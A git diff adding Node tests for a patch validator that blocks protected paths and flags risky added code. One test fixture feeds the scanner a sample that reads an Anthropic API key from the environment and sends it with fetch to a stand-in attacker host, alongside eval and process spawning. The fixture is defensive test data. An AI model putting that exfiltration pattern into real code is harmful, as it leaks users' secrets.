@@ -1,6 +1,6 @@
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
-import { checkChanges, parseDiff, LIMITS } from './validate-patch.js'
+import { checkChanges, parseDiff, scanAdded, formatRisk, LIMITS } from './validate-patch.js'
 
 const m = (path, extra = {}) => ({ status: 'M', srcMode: '100644', dstMode: '100644', path, added: 5, deleted: 2, ...extra })
 const goodSet = () => [m('packages/pulse/src/ui/badge.js'), m('packages/pulse/src/ui/ui.test.js', { added: 12, deleted: 0 })]
@@ -83,4 +83,51 @@ test('parseDiff reads git --raw --numstat output', () => {
   assert.deepEqual(c[0], { path: 'packages/pulse/src/ui/badge.js', status: 'M', srcMode: '100644', dstMode: '100644', added: 5, deleted: 2 })
   assert.equal(c[1].status, 'A')
   assert.equal(c[2].added, null)
+})
+
+test('rejects the highest-trust code: CLI, MCP tools and build/release scripts', () => {
+  for (const p of ['packages/pulse/src/cli/index.js', 'packages/pulse/src/cli/feedback.test.js', 'packages/pulse/src/mcp/server.js', 'packages/pulse/src/mcp/guards.js', 'packages/pulse/scripts/build.js', 'packages/pulse/scripts/strip-server.test.js']) {
+    const r = checkChanges([...goodSet(), m(p)])
+    assert.equal(r.ok, false, p)
+    assert.match(r.errors.join(), /protected path/, p)
+  }
+})
+
+test('rejects a path containing a backtick (it would break out of markdown code spans)', () => {
+  const r = checkChanges([...goodSet(), m('packages/pulse/src/ui/a`b.js')])
+  assert.equal(r.ok, false)
+  assert.match(r.errors.join(), /unsafe path/)
+})
+
+const diff = (file, lines, start = 10) => `+++ b/${file}\n@@ -1,0 +${start},${lines.length} @@\n${lines.map(l => '+' + l).join('\n')}`
+
+test('scanAdded flags risky primitives with file:line, and says nothing about clean code', () => {
+  assert.deepEqual(scanAdded(diff('packages/pulse/src/ui/badge.js', ['const x = a + b', 'return `<span>${x}</span>`'])), [])
+  const flags = scanAdded(diff('packages/pulse/src/server/index.js', [
+    'const a = 1',
+    "import { execSync } from 'node:child_process'",
+    "const k = process.env.ANTHROPIC_API_KEY",
+    "await fetch('https://collector.attacker.example/?k=' + k)",
+    "eval(payload)",
+  ]))
+  const byName = Object.fromEntries(flags.map(f => [f.name, f.locations]))
+  assert.deepEqual(byName['process spawning'], ['packages/pulse/src/server/index.js:11'])
+  assert.deepEqual(byName['environment variables'], ['packages/pulse/src/server/index.js:12'])
+  assert.deepEqual(byName['network access'], ['packages/pulse/src/server/index.js:13'])
+  assert.deepEqual(byName['dynamic code execution'], ['packages/pulse/src/server/index.js:14'])
+  assert.deepEqual(byName['new external URL'], ['packages/pulse/src/server/index.js:13'])
+})
+
+test('scanAdded ignores removed and context lines, and known hosts', () => {
+  const d = '+++ b/packages/pulse/src/ui/x.js\n@@ -1,2 +1,2 @@\n-process.env.SECRET\n context process.env.OTHER\n+// see https://schema.org/Thing and http://localhost:3000'
+  assert.deepEqual(scanAdded(d), [])
+})
+
+test('scanAdded spots long encoded blobs; formatRisk never repeats patch text', () => {
+  const blob = 'A'.repeat(100)
+  const flags = scanAdded(diff('packages/pulse/src/ui/x.js', [`const p = "${blob}"`, '@evil [click](https://e.co) `tick`']))
+  assert.ok(flags.some(f => f.name === 'encoded or obfuscated data'))
+  const md = formatRisk(flags)
+  assert.match(md, /`packages\/pulse\/src\/ui\/x\.js:10`/)
+  assert.ok(!md.includes('@evil') && !md.includes('click') && !md.includes(blob), 'report must contain locations only, not code')
 })
